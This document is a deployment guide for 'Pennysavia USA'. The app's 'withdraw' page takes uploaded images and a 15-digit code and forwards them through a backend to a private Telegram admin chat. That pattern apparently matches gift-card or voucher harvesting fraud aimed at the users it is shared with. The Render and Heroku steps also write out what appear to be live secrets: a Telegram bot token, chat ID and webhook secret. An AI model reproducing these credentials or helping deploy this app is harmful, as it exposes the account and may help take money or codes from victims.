# Deployment Guide for Pennysavia USA

This application is split into **frontend** (React + Vite) and **backend** (Express.js), allowing independent deployments to Netlify/Vercel and a Node.js hosting provider.

## Frontend Deployment (Netlify/Vercel)

### Prerequisites
- Git repository with `/src` and root config files
- Node.js 16+ installed locally

### Netlify Deployment

1. **Push to GitHub/GitLab/Bitbucket**
   ```bash
   git add .
   git commit -m "Initial commit"
   git push origin main
   ```

2. **Connect to Netlify**
   - Go to [netlify.com](https://netlify.com)
   - Click "New site from Git"
   - Select your repository
   - Configure build settings:
     - **Build command**: `npm run build`
     - **Publish directory**: `dist`
     - **Environment variables**: (none required for frontend)
   - Click "Deploy site"

3. **Configure API Proxy** (if backend on different domain)
   - Create `netlify.toml` in project root:
     ```toml
     [[redirects]]
     from = "/api/*"
     to = "https://your-backend.herokuapp.com/api/:splat"
     status = 200
     ```
   - Or set backend API URL in frontend `.env` and update fetch calls

### Vercel Deployment

1. **Connect to Vercel**
   - Go to [vercel.com](https://vercel.com)
   - Import your Git repository
   - Framework: **Vite**
   - Build command: `npm run build`
   - Output directory: `dist`
   - Deploy

2. **Environment Variables** (if needed)
   - Add in Vercel dashboard → Settings → Environment Variables
   - None required by default for this frontend

---

## Backend Deployment (Render / Heroku / Railway)

### Prerequisites
- `backend/` directory with `package.json`, `index.js`, `.env.example`
- Telegram bot token and chat ID (from `.env`)

### Deploy to Render.com (Recommended)

1. **Create Render Account**
   - Go to [render.com](https://render.com)
   - Sign up with GitHub

2. **Create New Web Service**
   - Click "+ New" → "Web Service"
   - Connect GitHub repo
   - Configure:
     - **Environment**: Node
     - **Build command**: `npm install`
     - **Start command**: `npm start`
     - **Root directory**: `backend`

3. **Add Environment Variables**
   - In Render dashboard → Environment:
     ```
     TELEGRAM_BOT_TOKEN=8403984953:AAEH68RfaaH--DaloJ7nmdMI2p2Av1678B8
     TELEGRAM_ADMIN_CHAT_ID=7099353645
     TELEGRAM_WEBHOOK_SECRET=tg-sec-7099353645-20260106
     PORT=4000
     NODE_ENV=production
     ```
   - Click "Deploy"

4. **Get Backend URL**
   - Render provides: `https://your-app.onrender.com`
   - Update frontend fetch calls to use this URL

### Deploy to Heroku

1. **Install Heroku CLI**
   ```bash
   npm install -g heroku
   ```

2. **Login & Create App**
   ```bash
   heroku login
   heroku create pennysavia-backend
   ```

3. **Set Environment Variables**
   ```bash
   heroku config:set TELEGRAM_BOT_TOKEN=8403984953:AAEH68RfaaH--DaloJ7nmdMI2p2Av1678B8
   heroku config:set TELEGRAM_ADMIN_CHAT_ID=7099353645
   heroku config:set TELEGRAM_WEBHOOK_SECRET=tg-sec-7099353645-20260106
   ```

4. **Deploy**
   ```bash
   git push heroku main
   ```

   Backend URL: `https://pennysavia-backend.herokuapp.com`

---

## Configure Frontend to Call Backend

### For Same-Domain Deployment (Recommended for simplicity)
If frontend and backend are on same domain (e.g., Netlify + Netlify Functions):
- Frontend calls `/api/send-telegram` (relative path)
- No configuration needed

### For Different Domains
If frontend and backend are separate:

1. **Create `.env` file in frontend root:**
   ```
   VITE_API_URL=https://your-backend.onrender.com
   ```

2. **Update fetch calls in `src/pages/WithdrawPage.jsx`:**
   ```jsx
   const apiUrl = import.meta.env.VITE_API_URL || '/api'
   const res = await fetch(`${apiUrl}/send-telegram`, {
     method: 'POST',
     ...
   })
   ```

3. **Add to `.env.example`:**
   ```
   VITE_API_URL=https://your-backend.onrender.com
   ```

---

## Health Check & Testing

### Check Backend is Running
```bash
curl https://your-backend.onrender.com/
# Expected response: { ok: true, message: "Pennysavia backend running" }
```

### Test Telegram Submission (curl)
```bash
curl -X POST https://your-backend.onrender.com/api/send-telegram \
  -H "Content-Type: application/json" \
  -d '{"images": ["data:image/jpeg;base64,/9j/4AAQSkZJRgABA..."], "code": "123456789012345"}'
```

---

## Performance Tips

### Frontend (Vite)
- Built-in code splitting via Vite
- CSS-in-JS and minification handled automatically
- No additional optimizations needed for basic deployments

### Backend (Express)
- Keep payload under 10MB (frontend limit)
- Image processing is base64 → Telegram, no file storage
- Monitor logs in Render/Heroku dashboards

---

## Troubleshooting

| Issue | Solution |
|-------|----------|
| "Cannot POST /api/send-telegram" | Backend not running or URL misconfigured. Check backend logs. |
| Images not received in Telegram | Verify TELEGRAM_BOT_TOKEN and TELEGRAM_ADMIN_CHAT_ID are correct. |
| Frontend showing "Network error" | CORS issue. Ensure backend has `cors()` enabled (it does). |
| Port 4000 already in use | Change `PORT` env var or stop conflicting process. |

---

## Local Development

### Run both frontend & backend locally:

**Terminal 1 (Frontend):**
```bash
npm run dev
# Frontend runs on http://localhost:5173
```

**Terminal 2 (Backend):**
```bash
cd backend
npm install
npm run dev
# Backend runs on http://localhost:4000
```

**Set frontend to call local backend** (if frontend .env exists):
```
VITE_API_URL=http://localhost:4000
```

---

## Summary

| Component | Hosting | Deploy Command |
|-----------|---------|-----------------|
| Frontend | Netlify / Vercel | `npm run build` → `dist/` |
| Backend | Render / Heroku | `npm start` in `backend/` |
| Images | Base64 in memory | No database required |
| Telegram | Bot API (server-side) | Set env vars, no code change |

Once deployed, share your Netlify/Vercel URL and backend URL with users. The app will handle image uploads, 15-digit code submission, and Telegram forwarding automatically.
